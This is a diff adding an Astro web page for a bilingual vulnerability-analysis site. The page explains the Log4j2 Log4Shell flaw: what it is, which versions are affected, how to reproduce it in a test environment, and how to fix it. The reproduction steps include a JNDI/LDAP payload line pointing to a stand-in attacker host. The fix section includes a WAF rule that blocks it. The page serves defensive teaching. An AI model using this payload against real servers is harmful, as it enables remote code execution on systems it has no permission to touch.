@@ -1,0 +1,68 @@
+---
+import BaseLayout from '../layouts/BaseLayout.astro';
+---
+
+<BaseLayout title="漏洞详情 - 挖洞吧" css={['article.css']}>
+<div class="container">
+    <!-- 左广告位 -->
+    <div class="side-space"></div>
+    <!-- 主体 -->
+    <div class="main">
+        <!-- 顶部 -->
+        <div class="top-bar">
+            <div class="top-left">
+                <button class="back-btn" onclick="goBackToList('/articles')">
+                    <span>←</span>
+                    <span data-cn="返回" data-en="Back">返回</span>
+                </button>
+                <div class="header">
+                    <h1 data-cn="挖洞吧" data-en="Hack Zone">挖洞吧</h1>
+                    <p data-cn="漏洞分析与复现" data-en="Vulnerability Analysis and Reproduction">漏洞分析与复现</p>
+                </div>
+            </div>
+            <div class="language-box">
+                <button class="language-btn" id="currentLang"><span class="lang-icon">🌐</span><span class="lang-text">简体中文</span></button>
+                <div class="language-dropdown">
+                    <button class="language-item" onclick="switchLanguage('zh')">简体中文</button>
+                    <button class="language-item" onclick="switchLanguage('en')">English</button>
+                </div>
+            </div>
+        </div>
+        <!-- 内容布局 -->
+        <div class="content-layout">
+            <!-- 正文 -->
+            <div class="article">
+                <h2 class="article-title" data-cn="Log4j 存在漏洞风险分析" data-en="Log4j Vulnerability Risk Analysis">Log4j 存在漏洞风险分析</h2>
+                <div class="section-title" data-cn="漏洞概述" data-en="Overview">漏洞概述</div>
+                <p data-cn="Apache Log4j2 是一个广泛使用的 Java 日志框架，由于其 JNDI 查找功能，存在严重的远程代码执行漏洞（CVE-2021-44228）。攻击者可以通过构造特殊的日志消息触发漏洞，在目标服务器上执行任意代码。" data-en="Apache Log4j2 is a widely used Java logging framework. Due to its JNDI lookup feature, there is a serious remote code execution vulnerability (CVE-2021-44228). Attackers can exploit the vulnerability by constructing special log messages to execute arbitrary code on the target server.">Apache Log4j2 是一个广泛使用的 Java 日志框架，由于其 JNDI 查找功能，存在严重的远程代码执行漏洞（CVE-2021-44228）。攻击者可以通过构造特殊的日志消息触发漏洞，在目标服务器上执行任意代码。</p>
+                <div class="section-title" data-cn="影响范围" data-en="Impact Scope">影响范围</div>
+                <p data-cn="该漏洞影响所有使用 Log4j2 2.0-beta9 到 2.14.1 版本的 Java 应用程序。包括但不限于 Spring Boot、Apache Struts、Elasticsearch 等主流框架。" data-en="This vulnerability affects all Java applications using Log4j2 versions 2.0-beta9 to 2.14.1. Including but not limited to Spring Boot, Apache Struts, Elasticsearch and other mainstream frameworks.">该漏洞影响所有使用 Log4j2 2.0-beta9 到 2.14.1 版本的 Java 应用程序。包括但不限于 Spring Boot、Apache Struts、Elasticsearch 等主流框架。</p>
+                <div class="section-title" data-cn="复现步骤" data-en="Reproduction Steps">复现步骤</div>
+                <p data-cn="1. 搭建包含 Log4j2 漏洞版本的测试环境。&#10;2. 构造包含 $&#123;jndi:ldap://attacker.com/exploit&#125; 的恶意请求。&#10;3. 观察服务器是否发起 LDAP 请求并执行远程代码。" data-en="1. Set up a test environment with a vulnerable Log4j2 version.&#10;2. Construct a malicious request containing $&#123;jndi:ldap://attacker.com/exploit&#125;.&#10;3. Observe whether the server initiates an LDAP request and executes remote code.">1. 搭建包含 Log4j2 漏洞版本的测试环境。&#10;2. 构造包含 $&#123;jndi:ldap://attacker.com/exploit&#125; 的恶意请求。&#10;3. 观察服务器是否发起 LDAP 请求并执行远程代码。</p>
+                <div class="section-title" data-cn="修复建议" data-en="Fix Recommendations">修复建议</div>
+                <p data-cn="1. 升级 Log4j2 到 2.15.0 或更高版本。&#10;2. 设置系统属性 log4j2.formatMsgNoLookups=true。&#10;3. 在 WAF 层面拦截包含 $&#123;jndi: 的请求。" data-en="1. Upgrade Log4j2 to version 2.15.0 or higher.&#10;2. Set system property log4j2.formatMsgNoLookups=true.&#10;3. Block requests containing $&#123;jndi: at the WAF level.">1. 升级 Log4j2 到 2.15.0 或更高版本。&#10;2. 设置系统属性 log4j2.formatMsgNoLookups=true。&#10;3. 在 WAF 层面拦截包含 $&#123;jndi: 的请求。</p>
+                <!-- 教程链接 -->
+                <div class="video-links">
+                    <h3 data-cn="相关教程" data-en="Related Tutorials">相关教程</h3>
+                    <a href="#" data-cn=" Log4j 漏洞详细复现视频" data-en="📺 Log4j Vulnerability Detailed Reproduction Video">📺 Log4j 漏洞详细复现视频</a>
+                    <a href="#" data-cn="📺 漏洞原理深度解析" data-en="📺 In-depth Vulnerability Analysis">📺 漏洞原理深度解析</a>
+                </div>
+            </div>
+            <!-- 右边广告预留 -->
+            <div class="right-box"></div>
+        </div>
+        <!-- 底部按钮 -->
+        <div class="footer-bar">
+            <button class="footer-btn page-btn" onclick="goBackToList('/articles')" data-cn="← 返回列表" data-en="← Back to List">← 返回列表</button>
+            <button class="footer-btn page-btn" data-cn="上一篇" data-en="Previous">上一篇</button>
+            <button class="footer-btn page-btn" data-cn="下一篇" data-en="Next">下一篇</button>
+        </div>
+    </div>
+</div>
+
+<!-- 固定在右侧的滚动按钮 -->
+<div class="scroll-float">
+    <button class="scroll-btn-top" onclick="scrollToTop()" title="置顶">⬆️</button>
+    <button class="scroll-btn-bottom" onclick="scrollToBottom()" title="置底">⬇️</button>
+</div>
+</BaseLayout>
